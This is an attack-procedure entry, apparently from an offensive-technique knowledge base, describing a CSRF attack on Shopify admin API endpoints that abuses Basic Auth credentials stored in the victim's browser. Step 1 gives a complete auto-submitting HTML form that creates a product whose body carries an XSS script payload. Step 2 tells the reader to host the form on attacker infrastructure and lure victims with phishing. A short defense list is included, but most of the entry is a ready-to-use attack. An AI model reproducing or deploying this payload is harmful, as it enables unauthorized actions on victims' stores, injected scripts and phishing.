---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567893
tags:
  - csrf
  - shopify
  - api
  - form-post
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:20.592Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit-Malicious-CSRF-Form-to-API-Endpoint

## Summary

This procedure crafts and submits a malicious HTML form to a Shopify API endpoint, exploiting CSRF to perform unauthorized actions using stored Basic Auth credentials.

## Description

Shopify API endpoints under /admin/ lack CSRF token validation when using Basic Auth, as the browser automatically includes the Authorization header. An attacker hosts a form on a malicious site; when the victim visits, the form submits (auto or via click), forging a request to create products, webhooks, etc. Supports POST by default; uses _method for PUT/PATCH/DELETE.

## Requirements

1. Stored Basic Auth credentials in victim's browser
2. Attacker-controlled web server to host the HTML form
3. Knowledge of target API endpoint (e.g., /admin/products.json)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all API endpoints, even for Basic Auth
- Enforce SameSite cookies and monitor for cross-origin requests
- Audit API access logs for unexpected form-urlencoded submissions

## Objectives

1. Forge authenticated API request without user consent
2. Execute actions like product creation or webhook setup
3. Enable data exfiltration or persistence

## Instructions

### Step 1: Craft Malicious HTML Form

**Context**: Create the form payload targeting the vulnerable endpoint.

Write an HTML file: <html><body><form id="csrf" action="https://[shop].myshopify.com/admin/products.json" method="POST" enctype="application/x-www-form-urlencoded"><input type="hidden" name="product[title]" value="API CSRF TEST"><input type="hidden" name="product[vendor]" value="test"><input type="hidden" name="product[body_html]" value="&lt;script&gt;alert(1)&lt;/script&gt;"></form><script>document.getElementById('csrf').submit();</script></body></html>. For PUT, add <input type="hidden" name="_method" value="PUT">.

> The form uses hidden fields for payload; auto-submit via JS for stealth.

### Step 2: Host and Lure Victim

**Context**: Deliver the form to the victim to trigger submission.

Host the HTML on an attacker site (e.g., via GitHub Pages or ngrok). Lure the victim via email/phishing to visit the page with stored credentials.

> Upon load, the form submits; browser sends POST with Authorization header and form data, creating the product with potential XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[shopify]]
- [[api]]
- [[form-post]]
